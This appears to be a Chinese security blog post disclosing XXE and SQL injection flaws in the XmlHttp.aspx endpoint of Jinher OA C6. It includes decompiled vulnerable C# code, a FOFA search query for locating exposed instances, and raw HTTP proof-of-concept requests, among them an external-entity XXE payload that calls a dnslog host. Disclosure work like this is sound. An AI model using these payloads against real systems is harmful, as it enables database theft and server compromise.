---
title: "金和OA Jhsoft.Web.Accept/XmlHttp.aspx XXE漏洞+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-Accept-XmlHttp-sqli-xxe.html
asset_dir: assets/金和oa-jhsoft.web.acceptxmlhttp.aspx-xxe漏洞+sql注入漏洞
---

# 金和OA Jhsoft.Web.Accept/XmlHttp.aspx XXE漏洞+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/11 08:15
* 624浏览
* [0评论](#comment)
* 57分钟阅读

深入探索

编程语言教程

漏洞扫描器

云安全解决方案


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `Jhsoft.Web.Accept/XmlHttp.aspx` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

网络安全会议

文本剥离工具

网络安全课程

在 `bin` 目录下查找 `JHSoft.Web.Accept.dll` 将其进行反编译后找到 `XmlHttp` 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  DBOperator dbOperator = DBOperatorFactory.GetDBOperator();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.Load(this.Request.InputStream);
  switch (xmlDocument.SelectSingleNode("//root//Flag").InnerText)
  {
    case "savesendperson":
      string innerText1 = xmlDocument.SelectSingleNode("//root//hid1").InnerText;
      string innerText2 = xmlDocument.SelectSingleNode("//root//hid2").InnerText;
      List<string> stringList = new List<string>();
      if (string.op_Inequality(innerText1, ""))
      {
        foreach (DataRow row in (InternalDataCollectionBase) dbOperator.ExecSQLReDataTable($"select userid from dbo.vw_Users where DeptID in ({innerText1}) and DeleteFlag = 0 and SysFlag = 0 and UserType<> 2").Rows)
        {
          if (!stringList.Contains(row["userid"].ToString()))
            stringList.Add(row["userid"].ToString());
        }
      }
      if (string.op_Inequality(innerText2, ""))
      {
        foreach (DataRow row in (InternalDataCollectionBase) dbOperator.ExecSQLReDataTable($"select userid from dbo.vw_Users where DeptID in ({innerText2}) and DeleteFlag = 0 and SysFlag = 0 and UserType<> 2").Rows)
        {
          if (!stringList.Contains(row["userid"].ToString()))
            stringList.Add(row["userid"].ToString());
        }
      }
      string str1 = "";
      foreach (string str2 in stringList)
        str1 = $"{str1}{str2},";
      string str3 = str1.TrimEnd(new char[1]{ ',' });
      string QueryString4 = $"delete from tb_hyz_ioasendPerson where datediff(day,getdate(),send_time)<>0 ; insert into tb_hyz_ioasendPerson values('{this.Session["usercode"].ToString()}','{str3}',getdate())";
      dbOperator.ExecSQLReInt(QueryString4);
      break;
    case "checkAnJuan":
      string innerText3 = xmlDocument.SelectSingleNode("//root//ajname").InnerText;
      string QueryString5 = $"select * from vw_ArchivesDossierSearch where dossyear = '{xmlDocument.SelectSingleNode("//root//nd").InnerText}' and dosstitle = '{innerText3}'";
      DataTable dataTable2 = dbOperator.ExecSQLReDataTable(QueryString5);
      if (dataTable2 != null && ((InternalDataCollectionBase) dataTable2.Rows).Count > 0)
        this.Response.Write("该年度案卷名称已存在！");
      else
        this.Response.Write("");
      this.Response.End();
      break;
    case "checkJGWT":
      string innerText4 = xmlDocument.SelectSingleNode("//root//jgwtname").InnerText;
      string QueryString6 = $"select * from ArchivesDossierType where delflag = 0 and DossTName = '{innerText4}'";
      string empty = string.Empty;
      try
      {
        string innerText5 = xmlDocument.SelectSingleNode("//root//id").InnerText;
        if (!string.IsNullOrEmpty(innerText5))
          QueryString6 = $"select * from ArchivesDossierType where delflag = 0 and DossTName = '{innerText4}' and DossTID<>'{innerText5}'";
      }
      catch
      {
      }
      DataTable dataTable3 = dbOperator.ExecSQLReDataTable(QueryString6);
      if (dataTable3 != null && ((InternalDataCollectionBase) dataTable3.Rows).Count > 0)
        this.Response.Write("该机构问题名称已存在！");
      else
        this.Response.Write("");
      this.Response.End();
      break;
    case "plan_time":
      string innerText6 = xmlDocument.SelectSingleNode("//root//userid").InnerText;
      string QueryString7 = $"select CalendarBeginTime from dbo.CalendarMain where CalendarTitle ='明日提示' and CalendarContent = '{xmlDocument.SelectSingleNode("//root//content").InnerText}' and CalendarUser='{innerText6}' and delFlag=0";
      DataTable dataTable4 = dbOperator.ExecSQLReDataTable(QueryString7);
      if (dataTable4 != null && ((InternalDataCollectionBase) dataTable4.Rows).Count > 0)
      {
        string str4 = $"{dataTable4.Rows[0][0].ToString().Split(new char[1]
        {
          ' '
        })[1].Split(new char[1]{ ':' })[0]}:{dataTable4.Rows[0][0].ToString().Split(new char[1]
        {
          ' '
        })[1].Split(new char[1]{ ':' })[1]}";
        this.Response.Write($"{dataTable4.Rows[0][0].ToString().Split(new char[1]
        {
          ' '
        })[0]}|{str4}|yes");
      }
      else
      {
        HttpResponse response = this.Response;
        DateTime dateTime = DateTime.Now;
        dateTime = dateTime.AddDays(1.0);
        string str5 = dateTime.ToString("yyyy-MM-dd") + "|09:00|no";
        response.Write(str5);
      }
      this.Response.End();
      break;
  }
}
```

请求内容直接使 `xmlDocument.Load` 加载处理，造成[XXE](https://mrxn.net/tag/XXE)漏洞，同时根据 `Flag` 的值不同做不同的处理,当 `Flag` 的值为 `savesendperson` 时，`hid1`、`hid2` 的值就被直接拼接进SQL语句中执行，无任何过滤和校验，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，其他如 `checkJGWT`、`plan_time` 也是存在同样的[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.Accept/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

[![金和OA Jhsoft.Web.Accept/XmlHttp.aspx XXE漏洞+SQL注入漏洞](images/img-001-8838208339ba.webp)](https://image.mrxn.net/6eec0ee38b864249bea069fc9eace4e2.webp)

## SQL注入

```
POST /c6/Jhsoft.Web.Accept/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<root>
  <hid1>1)SQLI_POC </hid1>
  <hid2>1)SQLI_POC </hid2>
  <ajname></ajname>
  <jgwtname></jgwtname>
  <id></id>
  <userid></userid>
  <Flag>savesendperson</Flag>
  <fieldcode></fieldcode>
</root>
```

[![金和OA Jhsoft.Web.Accept/XmlHttp.aspx XXE漏洞+SQL注入漏洞](images/img-002-64eaf8061428.webp)](https://image.mrxn.net/064ac222bb3a42288edd9efc88b7d205.webp)

成功延时 6 秒钟

SQL注入检测工具

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.XXE](#toc-5-1-)
* [5.2.SQL注入](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA Jhsoft.Web.Accept/XmlHttp.aspx XXE漏洞+SQL注入漏洞](https://mrxn.net/jswz/jhsoft-Accept-XmlHttp-sqli-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-Accept-XmlHttp-sqli-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

代码安全审计

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALeElEQVR4AeydgXLruA5De/b//3lfYBQSLctO2pub5O2oExYkCFKqaLVp787sP19fX//+1v4dPmqfpConP/wVSierGsWycPJliYWKq4mrVnPxk088w2hGrNrkKvcbXwO51a3Xp5xAG8htwl+P2tnmaz3wBbSeZzXiwVr5svQB84DonV1pZjnoe0lemKbyZYmFimXyqwG7r22mEfeo1d5tIJVc/vtO4DAQ8PThiGfbBGtneTjPjXqwFoyzJwycG2uv4vSpGvh5n1r/qA9eB44463EYyEy0uNedwFMHAv0pmD2V+rKgaxQ/auC69IV9LH7sJU4G1kJH8bLUgHOJK8I8B+aBKv8j/6kD+aOdrOLtBJ4yED1powG7dyLbardPVXcLt1e4LSifwD2AxgJb3xDgGAi15YGG6V8RnG9F307VfFMNYF7TBE9wnjKQJ+xjtfg+gb8zkO/mC35+AoeB1Cs7+vfag6809F/CwFx63euh/Ew7colnqB7VwHuoXOrCJQZroWNyV5g+I/605jCQseGKX3sCbSDQnwi49sctgvX1aYA9B45rLRy5mn/EB/cADvLs55C4EcD2Q//mbi9wnBrhliifwJpQ4BgI1RDY+sN9bEU3pw3k5q/XB5zAP3oSfmvZf+oTz3CmGbnE4Kdq1mfkUiMcc/DzPrWHespg3wccKxdLXeLf4rohOckPwdOBgJ8C6Jg9Q+eA0DvMExISePh76lirHuB6+TJwDEdUvlr6QdeGiw6cS1wx2mDN/cQHrwHGWe3pQGbixf39E/gHPC3Y42xpsGZ8UsA8dBzrU1MxmnCJwX3CC5OTLxtjcWc204YDrzXGYB5Iqt3wEEDjYO/PNOFGhF77/3RDxq/jPxmvgXzYWNvb3uzr7NpXHnzFwqX2CsE1Mw3sc+kL5oFDWTSHxI0Apt9Kbqn2AmtCzPqFg7k2+RmOfasmOdj3Fb9uiE7hg6z9UM8Eszfw9OCI0YJzqQkvDAd7DTiG/gdI6aul9grBfaoGzNVe8qsmvnhZ4p8geB3oONaDc5WHPaf1R1s3pJ7YB/iHgYCnmMnN9gj3NWPdVb9owX3BmBphNEFxMrAW+o2LBpyTThZeCM7Jl4Fj6WJw5JSTXiY/BtaCccarRpac/NEOAxkFK37tCbR3WeDJXi2fyQavtH8rB/f3CdaM+wTzcLxNV/sF140aMA/n/bKHiukDrk8sXDdEp/BBtgbyQcPQVtpA6pWSr6RMfgx8xcCo/D1L7UwH7gPGaINgHs6/JdS+YH04cAzG9BWCuWjFyRJXFC+rnHxxMcUzA68DtDSw/eI6q20DaerlvPUETgcCniJ0zESD4NzVVwDnmvQJjn3CC2HfB/axaqWTya8mTla5+OJlcN4PnAOj9DJwDB3Fy9K/IlgXDvax+NOBKLns9SfQ/nQyLq0pjwaeKBjHmhrD4xq4r81e6hrywwsV/6mB9wId1bta1phxyQWrZvSjqbhuSD2ND/DbL4bZC/QnAwi94TjhMd5E35+S+w63dxXQ3y0lXzHaZyOwrV/7Zl3Y58ILowdrwDjjwwXBWuiYXFBryKBr1g3J6XwItoGAp5R9aXKyxEKwBoziZLCPK6ce1cBa6Cj9zKBrwH56XemjCUYL7gEdrzTJjZh+lQ8XrLn44HWjmWEbyCy5uF+fwK8L10B+fXR/p/Dwtne8XuBrBrQdRBMiMbD98ASSOmC0FYFWBxxqREQPbFpxzzBwv/SveK8/uBZoUmC3P3AMHDTApq1rrhvSjukznF8NBDxZ2GOd9PjlwV4LPY429eBceCEcucoDCjcDtidvC04+Za3giWxHw/2+KYCjNmuNCNYCX78ayNf6+Gsn0AaSqYGnlbiuHG7EqokfDbhf+IrRVO5RP7UzTA/w2tGEF4JzYBR3ZrDXwD5WXdYYUbkYuA6M4WtNG0iSC997Am0g4KllWuB4tj2Y58A8dEx9+iYWgnXJwT4OL5R+ZuAaYJbeOODwM0U9ZZvg9gmOGjhyN+nlC+7XaF0ZWAsd20AuV1nJl53AGsjLjvqxhU7/2qvyM9N1k53lZzz4WqpuNNjnwHHtk5rKyQ8vVHxl0sTAayROHZiH41+mo7nCsV/VJgdeI7nwwnVDciofgm0gmk612f7Ak4U9zrTpldwYh68I7lu5Mx+shSOmJmsGoWujCUaTWAjWy79nYC3scVY3Wyu6NpAQC997Am0gcH+y2WomHAw/w2jA/asG9ly00YDzQKiG0VZMMhywvd0FY3hhtOBcYuVi4YJnvPJjLnFF6e5ZG8g94cq/5gQOA8lEr5aH/VP1iDZ9wbVwfBcDzkVbEfa5rAnmofdLLpg+0LVXObAuddGC+cQzTA1YCx2jB3PRhhceBiJy2ftOoA1knFbiKwRPOtuvWnAuHOxj8akbEaytvPQycA6MVTP60stGfhZLN1p04LXO8tHdQ3CfUQfmgfXn968P+2g35HX7WitdnUD7N3Xo1wZoNcDurSP0uIkecHLdodeD/bH8SptccKxVDO4LRnFnBucacC5rgWMwznqCc6mpmnDB5BIL1w3JqXwIHgaiKcnAk57tU/mZgWuAWdnG1bqNKJ+SK9TBBbYbm0RqhOFGBNdIEzvTgLXQ30aDubEmvYTJyZfBvCa6imAtsH6of33YR/vzu6Yqy/7kj5YceKKJg1Uf7jcI7j/rFw6s+Ul/cA3wk7KmzdrBlrg5wHZzwXijDi84z0V8+JaVxML3nEAbCHh6sMfZtmZPiHTQa6OBzsHeV40M7vPpJ3016LWVf9RP3+CsLjnoawEz6eH/KJRaYQqA7TYlrtgGUsnlv+8E1kDed/bTlU8Hoismq1WKZeArB8aqGX3pq435P43TWwjej3xZesuXJZ4huPYqpx7VqjY8uE/imWaWi+50IBEsfO0JnA4EPGnomK1lwkGwJrEQzKUG9rF46aqJk1UuvngZHPuIf8TSS3imVy4GXmuMZ7VgbXLgGM4x2vQXng4k4oWvPYE2EE1nZrPtwH7qqavakUtcEdwndcnBnk++4qgFWho4fVvZRIPzm37gdYChWw/TV9hZe8C2T+jYBmLJ+vzuE2gDgT4l6P5sg5p2Neh62Puphz0P/Y930TyCWTfaxFcYbcXoKyc/vFCxTL5MfjVxoyUfPrFwxomv1gZSyeW/7wTaP1BlesGrLYGf9lGT2opgbbixRjFYI1/2iBZcA+eoXvcMXH+lg70GHMMR0wfOc1df37ohOcEPwTWQy0G8Ptn+PWRcOteqYjThEgehX9NwI6ZWOOYSg/sknqHqz2ymFwfuCx3TQ/nRxtwYV31yI1YN9HWBlqo164a0Y/kMp/1QBw6/pMA1N34JddLg2nCjtsbRwL4GHANVvvOBtu9d4haAczf39AXWgLEKwVz2V3NnPrjmLH+PXzfk3gm9ON8GkqfgERz3mJqRvxfD/mka+yQWnvVSLnamCR9dxeSC4D1B/8UVzEWT+sQVr3JVJ3+mbQORYNn7T+AwEPDTAEc82y5YW/OZPjgHR4wmdWBN4isEa+GIYx0cNWBu3EOtBWsqJx+OPJiDPUofy1pBsDZ54WEgIpe97wTWQN539tOVnzoQ8BUEpouJzHUVAttbVvEycTLY88rBkRN/Zeolu9LAeV/VylIP1oq7Z6mpunDgPmMMrP+U9OvDPp5yQ+pTEB/2T0G+bjAPhGoI7G4MOIb+FrSJv52sV/E7tfUCEl5irY8/Fow8cLpGtNA1YH/sW+OnDKQ2XP6fncBhIJnsDO8tBX4CgCYd+7TEzUkO2J60G3X3lZqZEPZ9og3WmnBBcC0cMXXgXOLUCsE5MM400smSm+FhIDPR4l53Am0g4MnCfTzbnqYfiwb2/cILwbnUXKH01aIF94DznzOpS40wHLhe3GjRBJNPXPEsB+4PNHm0M2wDaerlvPUE1kDeevzHxf8HAAD//wIfKCcAAAAGSURBVAMAGzB+ehR9kjoAAAAASUVORK5CYII=)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-Accept-XmlHttp-sqli-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞修复方案

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALeElEQVR4AeydgXLruA5De/b//3lfYBQSLctO2pub5O2oExYkCFKqaLVp787sP19fX//+1v4dPmqfpConP/wVSierGsWycPJliYWKq4mrVnPxk088w2hGrNrkKvcbXwO51a3Xp5xAG8htwl+P2tnmaz3wBbSeZzXiwVr5svQB84DonV1pZjnoe0lemKbyZYmFimXyqwG7r22mEfeo1d5tIJVc/vtO4DAQ8PThiGfbBGtneTjPjXqwFoyzJwycG2uv4vSpGvh5n1r/qA9eB44463EYyEy0uNedwFMHAv0pmD2V+rKgaxQ/auC69IV9LH7sJU4G1kJH8bLUgHOJK8I8B+aBKv8j/6kD+aOdrOLtBJ4yED1powG7dyLbardPVXcLt1e4LSifwD2AxgJb3xDgGAi15YGG6V8RnG9F307VfFMNYF7TBE9wnjKQJ+xjtfg+gb8zkO/mC35+AoeB1Cs7+vfag6809F/CwFx63euh/Ew7colnqB7VwHuoXOrCJQZroWNyV5g+I/605jCQseGKX3sCbSDQnwi49sctgvX1aYA9B45rLRy5mn/EB/cADvLs55C4EcD2Q//mbi9wnBrhliifwJpQ4BgI1RDY+sN9bEU3pw3k5q/XB5zAP3oSfmvZf+oTz3CmGbnE4Kdq1mfkUiMcc/DzPrWHespg3wccKxdLXeLf4rohOckPwdOBgJ8C6Jg9Q+eA0DvMExISePh76lirHuB6+TJwDEdUvlr6QdeGiw6cS1wx2mDN/cQHrwHGWe3pQGbixf39E/gHPC3Y42xpsGZ8UsA8dBzrU1MxmnCJwX3CC5OTLxtjcWc204YDrzXGYB5Iqt3wEEDjYO/PNOFGhF77/3RDxq/jPxmvgXzYWNvb3uzr7NpXHnzFwqX2CsE1Mw3sc+kL5oFDWTSHxI0Apt9Kbqn2AmtCzPqFg7k2+RmOfasmOdj3Fb9uiE7hg6z9UM8Eszfw9OCI0YJzqQkvDAd7DTiG/gdI6aul9grBfaoGzNVe8qsmvnhZ4p8geB3oONaDc5WHPaf1R1s3pJ7YB/iHgYCnmMnN9gj3NWPdVb9owX3BmBphNEFxMrAW+o2LBpyTThZeCM7Jl4Fj6WJw5JSTXiY/BtaCccarRpac/NEOAxkFK37tCbR3WeDJXi2fyQavtH8rB/f3CdaM+wTzcLxNV/sF140aMA/n/bKHiukDrk8sXDdEp/BBtgby